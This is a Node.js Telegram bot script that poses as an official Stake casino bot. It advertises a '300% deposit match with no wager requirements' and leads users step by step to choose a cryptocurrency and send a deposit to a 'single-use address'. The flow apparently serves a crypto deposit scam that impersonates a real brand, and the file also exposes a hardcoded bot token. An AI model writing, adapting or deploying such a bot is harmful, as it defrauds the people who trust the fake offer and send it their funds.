const TelegramBot = require('node-telegram-bot-api');

// Replace with your bot's token from BotFather
const token = '7924314310:AAFTZs7PTtXGXD3Ww0RVBX3UjEsBD7OdhYA';
const bot = new TelegramBot(token, { polling: true });

// Respond to /start command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  // Send subscription confirmation messages
  bot.sendMessage(chatId, "Congratulations! You subscribed to Stake Bot.\n\nUse /off to pause your subscription.",{
    reply_markup: {
      keyboard: [
        ["💎 Claim Deposit Offer 💎"],
        ["🎟️ Raffle 🎟️"],
        ["🔎Channel Directory🔎"]
      ],
      resize_keyboard: true,
      input_field_placeholder: "Write a message..."
    }
  });
});

bot.onText(/\/Complete/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
    "After you click this button, your offer claim will be complete and your account will be credited after the confirmation is reached.✅"
  );
});

// Handle button presses
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text.startsWith('/')) return;

  if (text === "💎 Claim Deposit Offer 💎") {
    bot.sendPhoto(chatId, "public/pic.jpg", {}, { contentType: "image/jpeg" })

      .then(() => {
        bot.sendMessage(chatId, "🚨 Bonus Drop Alert 🚨\n\n" +
        "The month of March has started, which means we owe you a sweet deposit bonus! This monthly bonus seems to be our most requested so far. 😎\n\n" +
        "It's officially the month of good! Here's another offer boost to show how much we love our amazing players!\n" +
        "*Note:* both *new* AND *existing* users may claim these offers\n\n" +
        "💎 *300% match up to $300,000*\n" +
        "🚫 *No Wager Requirements*\n" +
        "📅 *Expires March 7th at 11:59PM UTC*\n\n" +
        "✅ You read that right, *NO wager requirements!* Players may withdraw the full amount immediately (if they wish!)\n\n" +
        "🚀 *Users who claim and deposit $10,000 or more* will receive the benefit of an *exclusive VIP Host* and *personalized bonuses for 7 calendar days!*\n" +
        "If you already have a *VIP Host*, you'll receive an *additional 50% deposit match instead.*\n\n" +
        "👉 Click *Claim Deposit Offer* for more details.", {
          reply_markup: {
            keyboard: [
              ["Claim Deposit Offer"],
              ["Go Back"]
            ],
            resize_keyboard: true
          }
        });
      });
  }

  if (text === "Cancel" || text === "Go Back") {  
    bot.sendMessage(chatId, "Main Menu", {
      reply_markup: {
        keyboard: [
          ["💎 Claim Deposit Offer 💎"],
          ["🎟️ Raffle 🎟️"],
          ["🔎Channel Directory🔎"]
        ],
        resize_keyboard: true,
        input_field_placeholder: "Write a message..."
      }
    });
  }

  if (text === "Claim Deposit Offer") {
    bot.sendMessage(chatId, "Will your deposit be for an account on Stake.com or Stake.us? (Select below) 👇🏼", {
      reply_markup: {
        keyboard: [
          ["Stake.com /Others","Stake.us"],
          ["Go Back"]
        ],
        resize_keyboard: true
      }
    });
  }
  
  if (text === "Stake.com /Others" || text === "Stake.us") { 
    bot.sendMessage(chatId, "What is your Stake username? (type below)", {
      reply_markup: {
        keyboard: [["Cancel"]],
        resize_keyboard: true
      }
    });

    bot.once("message", (msg) => {
      if (msg.text !== "Cancel") {
        bot.sendMessage(chatId, 
          "How much (in USD) would you like to deposit?\n" +
          "(Type your answer below)\n\n" +
          "Please respond with numbers only, no symbols please.\n" +
          "For example: 1000"
        );

        bot.once("message", (amountMsg) => {
          if (!isNaN(amountMsg.text)) {
            bot.sendMessage(chatId, "Done!", {
              reply_markup: {
                keyboard: [
                  ["Deposit Crypto"],
                  ["Go Back"]
                ],
                resize_keyboard: true
              }
            });

            bot.once("message", (depositMsg) => {
              if (depositMsg.text === "Deposit Crypto") {
                bot.sendMessage(chatId,
                  "Thank you, I will now retrieve a single-use address associated with the Stake username you provided, to facilitate our deposit match with no wager requirements.\n\n" +
                  "- Your deposit will appear in your Transactions page after 1 confirmation is reached.\n" +
                  "- Please note, any future deposits made to this address will be credited to your account, but will not receive a deposit match.\n" +
                  "- After clicking the \"Proceed\" button below, you will be given the option to \"Agree to Terms.\" By agreeing to terms, you confirm that you've read and understood this message.\n\n" +
                  "‼️ Please ensure that the username you provided is correct. If not, please click \"Cancel\" and restart the process.",
                  {
                    reply_markup: {
                      keyboard: [
                        ["Proceed"],
                        ["Go Back"]
                      ],
                      resize_keyboard: true
                    }
                  }
                );

                bot.once("message", (proceedMsg) => {
                  if (proceedMsg.text === "Proceed") {
                    bot.sendMessage(chatId, "‼️ You must click \"Agree to Terms\" to continue", {
                      reply_markup: {
                        keyboard: [
                          ["Agree to Terms"],
                          ["Go Back"]
                        ],
                        resize_keyboard: true
                      }
                    });

                    bot.once("message", (agreeMsg) => {
                      if (agreeMsg.text === "Agree to Terms") {
                        bot.sendMessage(chatId, "Done! ✅\nChoose your cryptocurrency 👇🏼", {
                          reply_markup: {
                            keyboard: [
                              ["BTC"], ["ETH"],
                              ["USDT"], ["USDC"]
                            ],
                            resize_keyboard: true
                          }
                        });
                        bot.on("message", (cryptoMsg) => {
                          let cryptoName = cryptoMsg.text;
                          if (["BTC", "ETH", "USDT", "USDC"].includes(cryptoName)) {
                            bot.sendMessage(cryptoMsg.chat.id, 
                              `Stake Bonus:\nYour single-use (${cryptoName}) address is below.\n\n⚠️ After you have sent your deposit, please click the following: \n\n/Complete`
                            );
                          }
                        });
                        
                        
                      }
                    });
                  }
                });
              }
            });
          } 
        });
      }
    });
}


  if (text === "🎟️ Raffle 🎟️") {
    bot.sendMessage(chatId, "Sorry, there is no active raffle at the moment!");
  }
  if (text === "🔎Channel Directory🔎") {
    bot.sendMessage(chatId, "Stake Telegram Channel Directory\n\n🌍 Stake.com - Play Smarter\n⏩ @StakeCasino\n\n🇺🇲 Stake.us - Play Smarter\n⏩ @StakeSocial");
  }
});

console.log("Bot is running...");
